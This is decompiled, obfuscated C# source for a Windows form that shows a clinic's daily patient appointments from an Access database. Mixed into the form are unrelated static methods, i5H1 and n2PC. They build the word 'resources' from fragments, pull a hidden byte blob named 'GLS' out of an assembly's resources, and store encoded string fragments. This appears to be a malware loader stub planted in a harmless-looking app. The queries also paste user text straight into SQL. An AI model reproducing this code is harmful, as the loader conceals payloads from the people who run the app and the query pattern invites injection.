using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Drawing;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Tm8;
using o3C;

namespace c1RE;

[DesignerGenerated]
public class Fy68 : Form
{
	private Panel _Panel1;

	private Button _Button2;

	private DateTimePicker _DateTimePicker1;

	private string strconnexion;

	private OleDbConnection oConnection;

	internal IContainer h;

	internal Label q;

	internal DataGridView Y;

	internal Button E;

	internal Button d;

	internal TextBox a;

	public Fy68()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)f9J8);
		strconnexion = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\\Users\\moham\\Desktop\\Base_Patient.mdb";
		oConnection = new OleDbConnection(strconnexion);
		Gi79();
	}

	protected override void x8LR(bool a3TW)
	{
		try
		{
			if (a3TW && h != null)
			{
				h.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(a3TW);
		}
	}

	private void Gi79()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_0370: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0541: Unknown result type (might be due to invalid IL or missing references)
		Jg04(new Panel());
		Wq97(new Button());
		Fq2g(new Label());
		Qx2k(new DataGridView());
		Ag1n(new Button());
		Jw3f(new DateTimePicker());
		Sr0o(new Button());
		r3K0(new TextBox());
		((Control)q4K5()).SuspendLayout();
		((ISupportInitialize)o7LH()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)q4K5()).set_BackColor(Color.Black);
		((Control)q4K5()).get_Controls().Add((Control)(object)Qi9d());
		((Control)q4K5()).get_Controls().Add((Control)(object)Fi67());
		((Control)q4K5()).set_Location(new Point(0, 0));
		((Control)q4K5()).set_Margin(new Padding(4));
		((Control)q4K5()).set_Name("Panel1");
		((Control)q4K5()).set_Size(new Size(879, 47));
		((Control)q4K5()).set_TabIndex(8);
		((ButtonBase)Qi9d()).set_FlatStyle((FlatStyle)1);
		((Control)Qi9d()).set_Location(new Point(795, 4));
		((Control)Qi9d()).set_Margin(new Padding(4));
		((Control)Qi9d()).set_Name("Button2");
		((Control)Qi9d()).set_Size(new Size(41, 44));
		((Control)Qi9d()).set_TabIndex(7);
		((ButtonBase)Qi9d()).set_UseVisualStyleBackColor(true);
		((Control)Fi67()).set_BackColor(Color.Black);
		((Control)Fi67()).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Fi67()).set_ForeColor(Color.LightGreen);
		((Control)Fi67()).set_Location(new Point(271, 10));
		((Control)Fi67()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Fi67()).set_Name("Label1");
		((Control)Fi67()).set_Size(new Size(309, 26));
		((Control)Fi67()).set_TabIndex(6);
		Fi67().set_Text("Les Rendez_vous d'Aujourd'hui");
		o7LH().set_BackgroundColor(Color.LightGreen);
		o7LH().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)o7LH()).set_Location(new Point(65, 127));
		((Control)o7LH()).set_Margin(new Padding(4));
		((Control)o7LH()).set_Name("DataGridView1");
		o7LH().set_RowHeadersWidth(51);
		((Control)o7LH()).set_Size(new Size(755, 299));
		((Control)o7LH()).set_TabIndex(9);
		((ButtonBase)Le10()).set_FlatStyle((FlatStyle)0);
		((Control)Le10()).set_Location(new Point(316, 470));
		((Control)Le10()).set_Margin(new Padding(4));
		((Control)Le10()).set_Name("Button1");
		((Control)Le10()).set_Size(new Size(172, 53));
		((Control)Le10()).set_TabIndex(13);
		((ButtonBase)Le10()).set_Text("Retour");
		((ButtonBase)Le10()).set_UseVisualStyleBackColor(true);
		((Control)t8Y9()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		t8Y9().set_Format((DateTimePickerFormat)2);
		((Control)t8Y9()).set_Location(new Point(65, 66));
		((Control)t8Y9()).set_Margin(new Padding(4));
		((Control)t8Y9()).set_Name("DateTimePicker1");
		((Control)t8Y9()).set_Size(new Size(253, 23));
		((Control)t8Y9()).set_TabIndex(14);
		t8Y9().set_Value(new DateTime(2020, 4, 13, 0, 0, 0, 0));
		((ButtonBase)z2M3()).set_FlatStyle((FlatStyle)0);
		((Control)z2M3()).set_Location(new Point(443, 55));
		((Control)z2M3()).set_Margin(new Padding(4));
		((Control)z2M3()).set_Name("Button3");
		((Control)z2M3()).set_Size(new Size(208, 53));
		((Control)z2M3()).set_TabIndex(16);
		((ButtonBase)z2M3()).set_Text("Rechercher");
		((ButtonBase)z2M3()).set_UseVisualStyleBackColor(true);
		((Control)r0M7()).set_Location(new Point(720, 86));
		((Control)r0M7()).set_Name("TextBox1");
		((Control)r0M7()).set_Size(new Size(100, 22));
		((Control)r0M7()).set_TabIndex(17);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.LightGreen);
		((Form)this).set_ClientSize(new Size(851, 536));
		((Control)this).get_Controls().Add((Control)(object)r0M7());
		((Control)this).get_Controls().Add((Control)(object)z2M3());
		((Control)this).get_Controls().Add((Control)(object)t8Y9());
		((Control)this).get_Controls().Add((Control)(object)Le10());
		((Control)this).get_Controls().Add((Control)(object)o7LH());
		((Control)this).get_Controls().Add((Control)(object)q4K5());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(4));
		((Control)this).set_Name("Form5");
		((Form)this).set_Text("Form5");
		((Control)q4K5()).ResumeLayout(false);
		((ISupportInitialize)o7LH()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Panel q4K5()
	{
		return _Panel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jg04(Panel j4FJ)
	{
		_Panel1 = j4FJ;
	}

	[SpecialName]
	internal virtual Button Qi9d()
	{
		return _Button2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wq97(Button a3AJ)
	{
		EventHandler eventHandler = Pf0b;
		Button button = _Button2;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button2 = a3AJ;
		button = _Button2;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Fi67()
	{
		return q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fq2g(Label b1HR)
	{
		Label val = (q = b1HR);
	}

	[SpecialName]
	internal virtual DataGridView o7LH()
	{
		return Y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qx2k(DataGridView o2A7)
	{
		DataGridView val = (Y = o2A7);
	}

	[SpecialName]
	internal virtual Button Le10()
	{
		return E;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ag1n(Button a2TK)
	{
		EventHandler eventHandler = f0N4;
		Button e = E;
		if (e != null)
		{
			((Control)e).remove_Click(eventHandler);
		}
		Button val = (E = a2TK);
		e = E;
		if (e != null)
		{
			((Control)e).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual DateTimePicker t8Y9()
	{
		return _DateTimePicker1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jw3f(DateTimePicker b9HW)
	{
		_DateTimePicker1 = b9HW;
	}

	[SpecialName]
	internal virtual Button z2M3()
	{
		return d;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sr0o(Button So56)
	{
		EventHandler eventHandler = Zs4g;
		Button val = d;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (d = So56);
		val = d;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox r0M7()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r3K0(TextBox Kc0x)
	{
		TextBox val = (a = Kc0x);
	}

	private void f9J8(object sender, EventArgs e)
	{
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		t8Y9().set_Value(DateAndTime.get_Now().Date);
		r0M7().set_Text(t8Y9().get_Value().ToShortDateString());
		((Control)r0M7()).set_Visible(false);
		string text = " SELECT Consultation.[Code_Consultation], Consultation.[Type d'analyse], Consultation.ID_Patient, Consultation.Datecon, Consultation.heure FROM Consultation WHERE (((Consultation.Datecon)='" + r0M7().get_Text() + "'))";
		try
		{
			oConnection.Open();
			OleDbCommand val = new OleDbCommand(text, oConnection);
			OleDbDataAdapter val2 = new OleDbDataAdapter(val);
			DataSet dataSet = new DataSet();
			((DbDataAdapter)(object)val2).Fill(dataSet, "Consultation");
			o7LH().set_DataSource((object)dataSet);
			o7LH().set_DataMember("Consultation");
			oConnection.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void f0N4(object sender, EventArgs e)
	{
		((Control)Qm5.Forms.Lb2()).Show();
		((Form)this).Close();
	}

	private void Pf0b(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		MsgBoxResult val = Interaction.MsgBox((object)"Vous voulez vraiment quitte ", (MsgBoxStyle)68, (object)"Confiramation");
		if ((int)val == 6)
		{
			Application.Exit();
		}
	}

	internal static byte[] i5H1(string[] r1P2, int Lm49)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[r1P2.Length - 1 + 1];
				int num = r1P2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = r1P2[i].Replace(string.Format("{0}{1}{2}{3}", ".re", "sou", "rc", "es"), "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)j8Y.mDic["Ann"]);
						byte[] array3 = (byte[])resourceManager.GetObject("GLS", CultureInfo.CurrentUICulture);
						if (array3.Length != Lm49)
						{
							continue;
						}
						result = array3;
						return result;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void Zs4g(object sender, EventArgs e)
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = " SELECT Consultation.[Code_Consultation], Consultation.[Type d'analyse], Consultation.ID_Patient, Consultation.Datecon, Consultation.heure FROM Consultation WHERE (((Consultation.Datecon)='" + r0M7().get_Text() + "'))";
		r0M7().set_Text(t8Y9().get_Value().ToShortDateString());
		try
		{
			oConnection.Open();
			OleDbCommand val = new OleDbCommand(text, oConnection);
			OleDbDataAdapter val2 = new OleDbDataAdapter(val);
			DataSet dataSet = new DataSet();
			((DbDataAdapter)(object)val2).Fill(dataSet, "Consultation");
			o7LH().set_DataSource((object)dataSet);
			o7LH().set_DataMember("Consultation");
			oConnection.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static void n2PC()
	{
		string[] s8C = new string[8] { "X", "B", "Q", "=", "X", "R", "Q", "=" };
		string value = j8Y.f9N(s8C, 0, 3);
		string value2 = j8Y.f9N(s8C, 4, 7);
		j8Y.mDic.Add(j8Y.tName, value);
		j8Y.mDic.Add(j8Y.mName, value2);
	}
}
